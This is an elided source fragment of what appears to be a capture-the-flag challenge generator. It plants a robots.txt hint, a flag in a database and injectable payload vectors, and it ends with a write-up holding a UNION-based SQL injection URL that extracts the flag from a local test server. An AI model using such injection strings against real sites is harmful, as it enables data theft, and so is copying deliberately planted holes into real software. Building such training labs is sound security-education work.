...
class instanceSample(refObject):
    ...
    def __call__(self):
        ...
        robots = """
        User-agent: *
        Disallow: /static/flag.txt
        """
        self.fp.write(os.path.join(self.fp.path, "robots.txt"),
                      robots, ext=None)
        ...
        <?php
            ...
            if(empty($result)) {
                ...
                $sql = "INSERT INTO $flag_table (flag) VALUES ('5ql1_fl46')";
    ...
    def generateHandler(self, tree_node=None, o=None, elem=None):
        ...
        if elem['type'] != "attrval":
            o[int(elem['lineno']) - 1] = re.sub(r'(.*)<{0}>(.*)</{0}>(.*)'.format(elem['identifier']), lambda m: "{0}{1}{2}".format(m.group(
                1), self.payloads['payloads'][0]['vector'].replace('{0}', 'mysql2.config.php').replace('{1}', m.group(2)), m.group(3)), o[int(elem['lineno']) - 1], flags=re.IGNORECASE)
        else:
            o[int(elem['lineno']) - 1] = re.sub(r'(.*)#+<{0}>(.*)</{0}>(.*)'.format(elem['identifier']), lambda m: "{0}{1}{2}".format(m.group(
                1), self.payloads['payloads'][0]['vector'].replace('{0}', 'mysql2.config.php').replace('{1}', m.group(2)), m.group(3)), o[int(elem['lineno']) - 1], flags=re.IGNORECASE)
        self.settings[
...
"""
Write up:
    - Find the first flag in http://127.0.0.1:8080/robots.txt
    - http://127.0.0.1:8080/?To_Meet=Boik' and 1=2 union select 1,2,(select flag from flags)--%20(注意最後面有一個空格)
"""
